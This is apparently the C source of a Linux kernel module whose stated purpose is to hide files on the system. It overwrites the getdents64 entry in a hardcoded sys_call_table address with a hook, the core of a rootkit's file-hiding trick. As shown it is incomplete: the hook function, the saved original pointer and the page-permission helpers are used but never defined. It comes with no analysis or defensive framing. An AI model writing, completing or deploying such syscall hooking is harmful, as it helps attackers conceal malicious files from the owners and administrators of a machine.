#include <linux/module.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/miscdevice.h>

MODULE_AUTHOR("Roman");
MODULE_DESCRIPTION("Hide files on the system");
MODULE_LICENSE("GPL");

void **sys_call_table;

static int __init hidefiles_init(void)
{

  sys_call_table = (void*)0xc1454100;
  original_getdents64 = sys_call_table[__NR_getdents64];

  set_page_rw(sys_call_table);
  sys_call_table[__NR_getdents64] = sys_getdents64_hook;
  set_page_ro(sys_call_table);
  return 0;
}

static void __exit hidefiles_exit(void)
{
  set_page_rw(sys_call_table);
  sys_call_table[__NR_getdents64] = original_getdents64;
  set_page_ro(sys_call_table);
  return;
}

module_init(hidefiles_init);
module_exit(hidefiles_exit);
